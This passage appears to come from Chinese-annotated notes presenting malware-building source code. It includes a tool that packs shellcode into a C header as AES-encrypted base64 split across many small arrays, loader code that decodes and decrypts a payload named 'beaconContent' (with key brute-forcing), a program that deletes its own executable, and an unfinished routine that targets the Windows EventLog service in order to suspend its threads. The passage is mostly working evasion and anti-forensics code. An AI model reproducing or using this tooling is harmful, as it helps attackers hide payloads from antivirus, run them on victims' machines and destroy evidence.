memcpy(&sc[144], sc_9, 16); memcpy(&sc[160], sc_10, 16); memcpy(&sc[176], sc_11, 16); memcpy(&sc[192], sc_12, 16); memcpy(&sc[208], sc_13, 16); memcpy(&sc[224], sc_14, 16); memcpy(&sc[240], sc_15, 16); memcpy(&sc[256], sc_16, 16); memcpy(&sc[272], sc_17, 16); memcpy(&sc[288], sc_18, 16); } void buildsc(){ buildsc_0(); } BYTE key[] = \"UAigTdFeIYYOvkQjbWUkdfNOffvcutRW\"; aes.c \u52a0\u5bc6\u7b97\u6cd5\u6e90\u6587\u4ef6 /*****************************************************************************/ /* Includes: */ /*****************************************************************************/ #include <string.h> // CBC mode, for memset #include \"aes.h\" #include <stdio.h> /*****************************************************************************/ /* Defines: */ /*****************************************************************************/ // The number of columns comprising a state in AES. This is a constant in AES. Value=4 #define Nb 4 #if defined(AES256) && (AES256 == 1) #define Nk 8 #define Nr 14 #elif defined(AES192) && (AES192 == 1) #define Nk 6 #define Nr 12 #else #define Nk 4 // The number of 32 bit words in a key. #define Nr 10 // The number of rounds in AES Cipher. #endif // jcallan@github points out that declaring Multiply as a function // reduces code size considerably with the Keil ARM compiler. // See this link for more information: https://github.com/kokke/tiny-AES-C/pull/3 #ifndef MULTIPLY_AS_A_FUNCTION #define MULTIPLY_AS_A_FUNCTION 0 #endif /*****************************************************************************/ /* Private variables: */ /*****************************************************************************/ // state - array holding the intermediate results during decryption. typedef uint8_t state_t[4][4]; // The lookup-tables are marked const so they can be placed in read-only storage instead of RAM // The numbers below can be computed dynamically trading ROM for RAM - // This can be useful in (embedded) bootloader applications, where ROM is often limited. static const uint8_t sbox[256] = { //0 1 2 3 4 5 6 7 8 9 A B C D E F 0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76, 0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0, 0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15, 0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75, 0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84, 0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf, 0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8, 0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2, 0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73, 0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb, 0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79, 0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08, 0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a, 0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e, 0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf, 0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16 }; #if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1) static const uint8_t rsbox[256] = { 0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb, 0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb, 0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e, 0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25, 0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92, 0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84, 0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06, 0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b, 0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73, 0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e, 0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b, 0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4, 0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f, 0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef, 0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d }; #endif // The round constant word array, Rcon[i], contains the values given by // x to the power (i-1) being powers of x (x is denoted as {02}) in the field GF(2^8) static const uint8_t Rcon[11] = { 0x8d, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36 }; /* * Jordan Goulder points out in PR #12 (https://github.com/kokke/tiny-AES-C/pull/12), * that you can remove most of the elements in the Rcon array, because they are unused. * * From Wikipedia's article on the Rijndael key schedule @ https://en.wikipedia.org/wiki/Rijndael_key_schedule#Rcon * * \"Only the first some of these constants are actually used ?up to rcon[10] for AES-128 (as 11 round keys are needed), * up to rcon[8] for AES-192, up to rcon[7] for AES-256. rcon[0] is not used in AES algorithm.\" */ /*****************************************************************************/ /* Private functions: */ /*****************************************************************************/ /* static uint8_t getSBoxValue(uint8_t num) { return sbox[num]; } */ #define getSBoxValue(num) (sbox[(num)]) // This function produces Nb(Nr+1) round keys. The round keys are used in each round to decrypt the states. static void KeyExpansion(uint8_t* RoundKey, const uint8_t* Key) { unsigned i, j, k; uint8_t tempa[4]; // Used for the column/row operations // The first round key is the key itself. for (i = 0; i < Nk; ++i) { RoundKey[(i * 4) + 0] = Key[(i * 4) + 0]; RoundKey[(i * 4) + 1] = Key[(i * 4) + 1]; RoundKey[(i * 4) + 2] = Key[(i * 4) + 2]; RoundKey[(i * 4) + 3] = Key[(i * 4) + 3]; } // All other round keys are found from the previous round keys. for (i = Nk; i < Nb * (Nr + 1); ++i) { { k = (i - 1) * 4; tempa[0] = RoundKey[k + 0]; tempa[1] = RoundKey[k + 1]; tempa[2] = RoundKey[k + 2]; tempa[3] = RoundKey[k + 3]; } if (i % Nk == 0) { // This function shifts the 4 bytes in a word to the left once. // [a0,a1,a2,a3] becomes [a1,a2,a3,a0] // Function RotWord() { const uint8_t u8tmp = tempa[0]; tempa[0] = tempa[1]; tempa[1] = tempa[2]; tempa[2] = tempa[3]; tempa[3] = u8tmp; } // SubWord() is a function that takes a four-byte input word and // applies the S-box to each of the four bytes to produce an output word. // Function Subword() { tempa[0] = getSBoxValue(tempa[0]); tempa[1] = getSBoxValue(tempa[1]); tempa[2] = getSBoxValue(tempa[2]); tempa[3] = getSBoxValue(tempa[3]); } tempa[0] = tempa[0] ^ Rcon[i / Nk]; } #if defined(AES256) && (AES256 == 1) if (i % Nk == 4) { // Function Subword() { tempa[0] = getSBoxValue(tempa[0]); tempa[1] = getSBoxValue(tempa[1]); tempa[2] = getSBoxValue(tempa[2]); tempa[3] = getSBoxValue(tempa[3]); } } #endif j = i * 4; k = (i - Nk) * 4; RoundKey[j + 0] = RoundKey[k + 0] ^ tempa[0]; RoundKey[j + 1] = RoundKey[k + 1] ^ tempa[1]; RoundKey[j + 2] = RoundKey[k + 2] ^ tempa[2]; RoundKey[j + 3] = RoundKey[k + 3] ^ tempa[3]; } } void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key) { KeyExpansion(ctx->RoundKey, key); } #if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1)) void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv) { KeyExpansion(ctx->RoundKey, key); memcpy(ctx->Iv, iv, AES_BLOCKLEN); } void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv) { memcpy(ctx->Iv, iv, AES_BLOCKLEN); } #endif // This function adds the round key to state. // The round key is added to the state by an XOR function. static void AddRoundKey(uint8_t round, state_t* state, const uint8_t* RoundKey) { uint8_t i, j; for (i = 0; i < 4; ++i) { for (j = 0; j < 4; ++j) { (*state)[i][j] ^= RoundKey[(round * Nb * 4) + (i * Nb) + j]; } } } // The SubBytes Function Substitutes the values in the // state matrix with values in an S-box. static void SubBytes(state_t* state) { uint8_t i, j; for (i = 0; i < 4; ++i) { for (j = 0; j < 4; ++j) { (*state)[j][i] = getSBoxValue((*state)[j][i]); } } } // The ShiftRows() function shifts the rows in the state to the left. // Each row is shifted with different offset. // Offset = Row number. So the first row is not shifted. static void ShiftRows(state_t* state) { uint8_t temp; // Rotate first row 1 columns to left temp = (*state)[0][1]; (*state)[0][1] = (*state)[1][1]; (*state)[1][1] = (*state)[2][1]; (*state)[2][1] = (*state)[3][1]; (*state)[3][1] = temp; // Rotate second row 2 columns to left temp = (*state)[0][2]; (*state)[0][2] = (*state)[2][2]; (*state)[2][2] = temp; temp = (*state)[1][2]; (*state)[1][2] = (*state)[3][2]; (*state)[3][2] = temp; // Rotate third row 3 columns to left temp = (*state)[0][3]; (*state)[0][3] = (*state)[3][3]; (*state)[3][3] = (*state)[2][3]; (*state)[2][3] = (*state)[1][3]; (*state)[1][3] = temp; } static uint8_t xtime(uint8_t x) { return ((x << 1) ^ (((x >> 7) & 1) * 0x1b)); } // MixColumns function mixes the columns of the state matrix static void MixColumns(state_t* state) { uint8_t i; uint8_t Tmp, Tm, t; for (i = 0; i < 4; ++i) { t = (*state)[i][0]; Tmp = (*state)[i][0] ^ (*state)[i][1] ^ (*state)[i][2] ^ (*state)[i][3]; Tm = (*state)[i][0] ^ (*state)[i][1]; Tm = xtime(Tm); (*state)[i][0] ^= Tm ^ Tmp; Tm = (*state)[i][1] ^ (*state)[i][2]; Tm = xtime(Tm); (*state)[i][1] ^= Tm ^ Tmp; Tm = (*state)[i][2] ^ (*state)[i][3]; Tm = xtime(Tm); (*state)[i][2] ^= Tm ^ Tmp; Tm = (*state)[i][3] ^ t; Tm = xtime(Tm); (*state)[i][3] ^= Tm ^ Tmp; } } // Multiply is used to multiply numbers in the field GF(2^8) // Note: The last call to xtime() is unneeded, but often ends up generating a smaller binary // The compiler seems to be able to vectorize the operation better this way. // See https://github.com/kokke/tiny-AES-c/pull/34 #if MULTIPLY_AS_A_FUNCTION static uint8_t Multiply(uint8_t x, uint8_t y) { return (((y & 1) * x) ^ ((y >> 1 & 1) * xtime(x)) ^ ((y >> 2 & 1) * xtime(xtime(x))) ^ ((y >> 3 & 1) * xtime(xtime(xtime(x)))) ^ ((y >> 4 & 1) * xtime(xtime(xtime(xtime(x)))))); /* this last call to xtime() can be omitted */ } #else #define Multiply(x, y) \\ ( ((y & 1) * x) ^ \\ ((y>>1 & 1) * xtime(x)) ^ \\ ((y>>2 & 1) * xtime(xtime(x))) ^ \\ ((y>>3 & 1) * xtime(xtime(xtime(x)))) ^ \\ ((y>>4 & 1) * xtime(xtime(xtime(xtime(x)))))) \\ #endif #if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1) /* static uint8_t getSBoxInvert(uint8_t num) { return rsbox[num]; } */ #define getSBoxInvert(num) (rsbox[(num)]) // MixColumns function mixes the columns of the state matrix. // The method used to multiply may be difficult to understand for the inexperienced. // Please use the references to gain more information. static void InvMixColumns(state_t* state) { int i; uint8_t a, b, c, d; for (i = 0; i < 4; ++i) { a = (*state)[i][0]; b = (*state)[i][1]; c = (*state)[i][2]; d = (*state)[i][3]; (*state)[i][0] = Multiply(a, 0x0e) ^ Multiply(b, 0x0b) ^ Multiply(c, 0x0d) ^ Multiply(d, 0x09); (*state)[i][1] = Multiply(a, 0x09) ^ Multiply(b, 0x0e) ^ Multiply(c, 0x0b) ^ Multiply(d, 0x0d); (*state)[i][2] = Multiply(a, 0x0d) ^ Multiply(b, 0x09) ^ Multiply(c, 0x0e) ^ Multiply(d, 0x0b); (*state)[i][3] = Multiply(a, 0x0b) ^ Multiply(b, 0x0d) ^ Multiply(c, 0x09) ^ Multiply(d, 0x0e); } } // The SubBytes Function Substitutes the values in the // state matrix with values in an S-box. static void InvSubBytes(state_t* state) { uint8_t i, j; for (i = 0; i < 4; ++i) { for (j = 0; j < 4; ++j) { (*state)[j][i] = getSBoxInvert((*state)[j][i]); } } } static void InvShiftRows(state_t* state) { uint8_t temp; // Rotate first row 1 columns to right temp = (*state)[3][1]; (*state)[3][1] = (*state)[2][1]; (*state)[2][1] = (*state)[1][1]; (*state)[1][1] = (*state)[0][1]; (*state)[0][1] = temp; // Rotate second row 2 columns to right temp = (*state)[0][2]; (*state)[0][2] = (*state)[2][2]; (*state)[2][2] = temp; temp = (*state)[1][2]; (*state)[1][2] = (*state)[3][2]; (*state)[3][2] = temp; // Rotate third row 3 columns to right temp = (*state)[0][3]; (*state)[0][3] = (*state)[1][3]; (*state)[1][3] = (*state)[2][3]; (*state)[2][3] = (*state)[3][3]; (*state)[3][3] = temp; } #endif // #if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1) // Cipher is the main function that encrypts the PlainText. static void Cipher(state_t* state, const uint8_t* RoundKey) { uint8_t round = 0; // Add the First round key to the state before starting the rounds. AddRoundKey(0, state, RoundKey); // There will be Nr rounds. // The first Nr-1 rounds are identical. // These Nr rounds are executed in the loop below. // Last one without MixColumns() for (round = 1; ; ++round) { SubBytes(state); ShiftRows(state); if (round == Nr) { break; } MixColumns(state); AddRoundKey(round, state, RoundKey); } // Add round key to last round AddRoundKey(Nr, state, RoundKey); } #if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1) static void InvCipher(state_t* state, const uint8_t* RoundKey) { uint8_t round = 0; // Add the First round key to the state before starting the rounds. AddRoundKey(Nr, state, RoundKey); // There will be Nr rounds. // The first Nr-1 rounds are identical. // These Nr rounds are executed in the loop below. // Last one without InvMixColumn() for (round = (Nr - 1); ; --round) { InvShiftRows(state); InvSubBytes(state); AddRoundKey(round, state, RoundKey); if (round == 0) { break; } InvMixColumns(state); } } #endif // #if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1) /*****************************************************************************/ /* Public functions: */ /*****************************************************************************/ #if defined(ECB) && (ECB == 1) void AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf) { // The next function call encrypts the PlainText with the Key using AES algorithm. Cipher((state_t*)buf, ctx->RoundKey); } void AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf) { // The next function call decrypts the PlainText with the Key using AES algorithm. InvCipher((state_t*)buf, ctx->RoundKey); } #endif // #if defined(ECB) && (ECB == 1) #if defined(CBC) && (CBC == 1) static void XorWithIv(uint8_t* buf, const uint8_t* Iv) { uint8_t i; for (i = 0; i < AES_BLOCKLEN; ++i) // The block in AES is always 128bit no matter the key size { buf[i] ^= Iv[i]; } } void AES_CBC_encrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length) { size_t i; uint8_t* Iv = ctx->Iv; for (i = 0; i < length; i += AES_BLOCKLEN) { XorWithIv(buf, Iv); Cipher((state_t*)buf, ctx->RoundKey); Iv = buf; buf += AES_BLOCKLEN; } /* store Iv in ctx for next call */ memcpy(ctx->Iv, Iv, AES_BLOCKLEN); } void AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length) { size_t i; uint8_t storeNextIv[AES_BLOCKLEN]; for (i = 0; i < length; i += AES_BLOCKLEN) { memcpy(storeNextIv, buf, AES_BLOCKLEN); InvCipher((state_t*)buf, ctx->RoundKey); XorWithIv(buf, ctx->Iv); memcpy(ctx->Iv, storeNextIv, AES_BLOCKLEN); buf += AES_BLOCKLEN; } } #endif // #if defined(CBC) && (CBC == 1) #if defined(CTR) && (CTR == 1) /* Symmetrical operation: same function for encrypting as for decrypting. Note any IV/nonce should never be reused with the same key */ void AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length) { uint8_t buffer[AES_BLOCKLEN]; size_t i; int bi; for (i = 0, bi = AES_BLOCKLEN; i < length; ++i, ++bi) { if (bi == AES_BLOCKLEN) /* we need to regen xor compliment in buffer */ { memcpy(buffer, ctx->Iv, AES_BLOCKLEN); Cipher((state_t*)buffer, ctx->RoundKey); /* Increment Iv and handle overflow */ for (bi = (AES_BLOCKLEN - 1); bi >= 0; --bi) { /* inc will overflow */ if (ctx->Iv[bi] == 255) { ctx->Iv[bi] = 0; continue; } ctx->Iv[bi] += 1; break; } bi = 0; } buf[i] = (buf[i] ^ buffer[bi]); } } #endif // #if defined(CTR) && (CTR == 1) helpers.c #define _CRT_SECURE_NO_WARNINGS #include \"helpers.h\" int AES_KEY_LENGTH = 32; void build_decoding_table() { decoding_table = (char*)malloc(256); if (decoding_table == NULL) { DEBUG(\"[x] Cannot allocate memory for the decoding table\\n\"); exit(-1); } for (int i = 0; i < 64; i++) { decoding_table[(unsigned char)encoding_table[i]] = i; } } unsigned char* base64_decode(const char* data, size_t input_length, size_t* output_length) { if (decoding_table == NULL) build_decoding_table(); if (input_length % 4 != 0) return NULL; *output_length = input_length / 4 * 3; if (data[input_length - 1] == '=') { (*output_length)--; } if (data[input_length - 2] == '=') (*output_length)--; unsigned char* decoded_data = (unsigned char*)malloc(*output_length); if (decoded_data == NULL) return NULL; for (int i = 0, j = 0; i < input_length;) { DWORD sextet_a = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]]; DWORD sextet_b = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]]; DWORD sextet_c = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]]; DWORD sextet_d = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]]; DWORD triple = (sextet_a << 3 * 6) + (sextet_b << 2 * 6) + (sextet_c << 1 * 6) + (sextet_d << 0 * 6); if (j < *output_length) decoded_data[j++] = (triple >> 2 * 8) & 0xFF; if (j < *output_length) decoded_data[j++] = (triple >> 1 * 8) & 0xFF; if (j < *output_length) decoded_data[j++] = (triple >> 0 * 8) & 0xFF; } return decoded_data; } BOOL aes_decrypt(const uint8_t* key, size_t szKey, unsigned char* encrypted, size_t szEncrypted, unsigned char* unencryptedData) { // First 16 bytes represent the IV. uint8_t* iv = (uint8_t*)calloc(16, sizeof(uint8_t)); if (!iv) { DEBUG(\"[x] AES decryption failed (couldn't allocate IV).\\n\"); return FALSE; } memcpy(iv, encrypted, 16 * sizeof(uint8_t)); size_t szEncryptedData = szEncrypted - 16; memcpy(unencryptedData, &encrypted[16], szEncryptedData * sizeof(unsigned char)); struct AES_ctx ctx; // If the provided key is not complete (length != 32 bytes), a bruteforce is attempted. // Iterates over the missing bytes using the provided partial key as input. if (AES_KEY_LENGTH == szKey) { AES_init_ctx_iv(&ctx, key, iv); AES_CBC_decrypt_buffer(&ctx, unencryptedData, szEncryptedData); free(iv); return TRUE; } else { DWORD missingKeyLength = AES_KEY_LENGTH - szKey; DEBUG(\"[-] Provided key is missing %i bytes\\n\", missingKeyLength); uint8_t* missingKey = (uint8_t*)calloc(missingKeyLength, sizeof(unsigned char)); uint8_t* fullKey = (uint8_t*)calloc(AES_KEY_LENGTH + 1, sizeof(unsigned char)); if (!missingKey || !fullKey) { DEBUG(\"[x] AES decryption failed (couldn't allocate key elements).\\n\"); return FALSE; } uint8_t index = 0; memcpy(fullKey, key, (AES_KEY_LENGTH - missingKeyLength) * sizeof(uint8_t)); while (TRUE) { while (missingKey[index] <= 254) { memcpy(&fullKey[AES_KEY_LENGTH - missingKeyLength], missingKey, missingKeyLength * sizeof(uint8_t)); AES_init_ctx_iv(&ctx, fullKey, iv); AES_CBC_decrypt_buffer(&ctx, unencryptedData, szEncryptedData); uint8_t padding = unencryptedData[szEncryptedData - 1]; // Validate the decryption by checking that the last 4 bytes are egal to 0. if (unencryptedData[szEncryptedData - padding - 4] == 0x0 && unencryptedData[szEncryptedData - padding - 3] == 0x0 && unencryptedData[szEncryptedData - padding - 2] == 0x0 && unencryptedData[szEncryptedData - padding - 1] == 0x0) { free(iv); free(missingKey); free(fullKey); return TRUE; } else { memcpy(unencryptedData, &encrypted[16], szEncryptedData * sizeof(unsigned char)); } missingKey[index] += 1; } for (uint8_t i = 0; i < missingKeyLength; i++) { if (missingKey[i] == 255) { missingKey[i] = 0; if (i < missingKeyLength - 1) { missingKey[i + 1] += 1; } else { DEBUG(\"[x] AES decryption failed could not find the key.\\n\"); return FALSE; } } } } } } unsigned char* xor_text(const char* buff) { size_t size = strlen(buff); size_t osize; unsigned char* result = base64_decode(buff, size, &osize); for (int i = 0; i < osize; i++) { result[i] = result[i] ^ 0xA7; } return result; } wchar_t* char2wc(const char* buff) { const size_t cSize = strlen(buff) + 1; wchar_t* wc = malloc(cSize * sizeof(wchar_t)); mbstowcs(wc, buff, cSize); return wc; } python\u6587\u4ef6\uff0c\u52a0\u5bc6\u751f\u6210shellcode\uff0c\u968f\u673a\u751f\u6210\u52a0\u5bc6key from base64 import b64encode from Crypto.Cipher import AES from Crypto.Util.Padding import pad, unpad from Crypto import Random import os import sys import string import random #key = b\"HrKHQxhUNxWuQxYdVEOZhoYbRcHeFmHS\" key = ''.join(random.choice(string.ascii_letters) for i in range(32)) key = key.encode() if len(sys.argv) == 3: key = sys.argv[2].encode() try: file = open(sys.argv[1], 'rb') data = file.read() file.close() except IndexError: data = shellcode data += b'\\x00\\x00\\x00\\x00' iv = Random.new().read(AES.block_size) cipher = AES.new(key, AES.MODE_CBC, iv) enc = cipher.encrypt(pad(data, AES.block_size)) ciphertext = b64encode(iv + enc) file = open('../sc.h', 'w') i = 1 k = 0 file.write('#define _CRT_SECURE_NO_WARNINGS\\n#pragma once\\n#include <string.h>\\n\\n') for j in range(len(ciphertext)): elt = ciphertext[j] if(i%16 == 1): if(i//16 % 2 == 0): file.write('const char sc_' + format(i//16) + '[16] = {') else: file.write('char sc_' + format(i//16) + '[16] = {') k += 1 file.write('{}'.format(hex(elt))) if(i%16 == 0): file.write('};\\n') elif j != len(ciphertext) - 1: file.write(',') i += 1 if(i%16 != 1): file.write('};\\n') file.write('\\nchar sc[{}];\\n'.format(len(ciphertext))) file.write('int sc_length = {};\\n'.format(len(ciphertext))) file.write(\"void buildsc_0(){\\n\") l = 1 m = 1 for i in range(k): file.write('\\tmemcpy(&sc[{}], sc_{}, 16);\\n'.format(i*16, i)) if(l % 200 == 0): file.write(\"}\\nvoid buildsc_\" + format(m) + \"(){\\n\") m += 1 l += 1 file.write(\"}\\n\") file.write(\"void buildsc(){\\n\") for i in range(m): file.write(\"\\tbuildsc_{}();\\n\".format(i)) file.write(\"}\") file.write('\\nBYTE key[] = \"{}\";\\n'.format(key.decode())) file.close() main\u6587\u4ef6 #include \"helpers.h\" #include <TlHelp32.h> #include \"sc.h\" int main(void) { buildsc(); //\u8c03\u7528\u51fd\u6570\u7ec4\u5408shellcode\uff0cshellcode\u5b58\u50a8\u5230sc\u6570\u7ec4 //\u5bf9shellcode base64\u89e3\u7801 size_t szOutput = 0; DWORD size = 0; unsigned char* file_enc = NULL; BYTE* beaconContent = NULL; size_t beaconSize = NULL; file_enc = base64_decode(sc, sc_length, &szOutput); if (szOutput == 0) { DEBUG(\"[x] Base64 decode failed \\n\"); return -1; } for (int i = 0; i < sc_length; i++) { printf(\"0x%x,\", file_enc[i]); } printf(\"\\n\"); //AES\u89e3\u5bc6 beaconSize = szOutput - 16; beaconContent = (unsigned char*)calloc(beaconSize, sizeof(BYTE)); BOOL decryptStatus = aes_decrypt(key, (sizeof(key) / sizeof(key[0])) - 1, file_enc, beaconSize, beaconContent); if (!decryptStatus || beaconContent == NULL) { DEBUG(\"[x] AES decryption failed\\n\"); return -1; } //\u5b8c\u5168\u89e3\u5bc6\u540e\u7684\u6570\u636e\u5b58\u50a8\u5728beaconContent\u6570\u7ec4\u4e2d for (int i = 0; i < beaconSize; i++) { printf(\"0x%x,\", beaconContent[i]); } printf(\"\\n\"); } \u5176\u4ed6 \u7a0b\u5e8f\u81ea\u5220\u9664\u529f\u80fd \u8fd9\u4e2a\u7a0b\u5e8f\u53ea\u4f1a\u81ea\u5220\u9664 #include <Windows.h> #include <strsafe.h> #define SELF_REMOVE_STRING TEXT(\"cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \\\"%s\\\"\") void DelMe() { TCHAR szModuleName[MAX_PATH]; TCHAR szCmd[2 * MAX_PATH]; STARTUPINFO si = {0}; PROCESS_INFORMATION pi = {0}; GetModuleFileName(NULL, szModuleName, MAX_PATH); StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName); CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi); CloseHandle(pi.hThread); CloseHandle(pi.hProcess); } void main() { DelMe(); } \u6302\u8d77Windows\u4e8b\u4ef6\u670d\u52a1 \u4ecesvchost\u4e2d\u83b7\u53d6windows\u4e8b\u4ef6\u8fdb\u7a0b\uff0c\u5728\u8fdb\u7a0b\u4e2d\u679a\u4e3e\u7ebf\u7a0b\u5e76\u6302\u8d77\u3002 \u672c\u5730\u672a\u6d4b\u8bd5\u6210\u529f\uff0c\u53ef\u80fd\u8ddf\u6743\u9650\u95ee\u9898\u6709\u5173 #include <iostream> #include <Windows.h> #include <Psapi.h> #include <TlHelp32.h> #include <dbghelp.h> #include <winternl.h> #include <strsafe.h> #pragma comment(lib, \"DbgHelp\") using myNtQueryInformationThread = NTSTATUS(NTAPI*)( IN HANDLE ThreadHandle, IN THREADINFOCLASS ThreadInformationClass, OUT PVOID ThreadInformation, IN ULONG ThreadInformationLength, OUT PULONG ReturnLength ); int main() { HANDLE serviceProcessHandle; HANDLE snapshotHandle; HANDLE threadHandle; HMODULE modules[2048] = {}; SIZE_T modulesSize = sizeof(modules); DWORD modulesSizeNeeded = 0; DWORD moduleNameSize = 0; SIZE_T modulesCount = 0; WCHAR remoteModuleName[128] = {}; HMODULE serviceModule = NULL; MODULEINFO serviceModuleInfo = {}; DWORD_PTR threadStartAddress = 0; DWORD bytesNeeded = 0; myNtQueryInformationThread NtQueryInformationThread = (myNtQueryInformationThread)(GetProcAddress(GetModuleHandleA(\"ntdll\"), \"NtQueryInformationThread\")); THREADENTRY32 threadEntry; threadEntry.dwSize = sizeof(THREADENTRY32); SC_HANDLE sc = OpenSCManagerA(\".\", NULL, MAXIMUM_ALLOWED); SC_HANDLE service = OpenServiceA(sc, \"EventLog\", MAXIMUM_ALLOWED); SERVICE_STATUS_PROCESS serviceStatusProcess = {}; //# Get PID of svchost.exe that hosts EventLog service QueryServiceStatusEx(service, SC_STATUS_PROCESS_INFO, (LPBYTE)&serviceStatusProcess, sizeof(serviceStatusProcess), &bytesNeeded); DWORD servicePID = serviceStatusProcess.dwProcessId; //# Open handle to the svchost.exe //serviceProcessHandle = OpenProcess(MAXIMUM_ALLOWED, FALSE, servicePID); serviceProcessHandle = 